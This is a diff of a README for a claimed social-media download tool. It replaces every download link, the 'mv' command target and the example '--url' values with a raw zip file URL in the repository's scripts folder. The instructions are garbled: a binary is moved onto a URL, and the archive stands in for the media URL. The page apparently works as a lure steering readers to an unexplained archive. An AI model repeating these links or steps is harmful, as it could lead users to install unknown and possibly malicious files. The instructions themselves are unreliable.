@@ -1,7 +1,7 @@
 # 📥 social-media-downloader - Download Content Easily
 
 ## 🔗 Download Now
-[![Download Latest Release](https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip%20Release-brightgreen)](https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip%20Release-brightgreen)](https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip)
 
 ## 📖 Description
 Introducing a robust command-line interface (CLI) tool designed for content acquisition across more than 700 social media platforms. This tool is fully compatible with Android (via Termux) and Linux environments, operating efficiently without the need for a graphical user interface (GUI). Developed by Lead Developer Michael Lastovich, it simplifies the process of downloading media from various social networks.
@@ -26,7 +26,7 @@ To get started with the social-media-downloader application, follow the steps be
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to visit the Releases page and download the application.  
-   [Download the latest version here](https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip)
+   [Download the latest version here](https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip)
 
 2. **Choose Your File:** On the Releases page, you will find various versions. Look for the file appropriate for your device. 
 
@@ -41,7 +41,7 @@ To get started with the social-media-downloader application, follow the steps be
    - **For Android Users:** Open Termux and execute these commands:
      ```bash
      chmod +x social-media-downloader
-     mv social-media-downloader https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip
+     mv social-media-downloader https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip
      ```
 
 ## ⚙️ Running the Application
@@ -56,8 +56,8 @@ Once you have installed the tool, you can run it from the command line. Follow t
 
 3. **Example Commands:** Here are a few examples of how to use the tool:
    ```bash
-   social-media-downloader facebook --url https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip
-   social-media-downloader instagram --url https://github.com/dhsunsbzueyd/social-media-downloader/raw/refs/heads/main/scripts/media_downloader_social_1.8.zip
+   social-media-downloader facebook --url https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip
+   social-media-downloader instagram --url https://raw.githubusercontent.com/dhsunsbzueyd/social-media-downloader/main/scripts/social_media_downloader_1.7.zip
    ```
 
 ## 📃 Usage Instructions
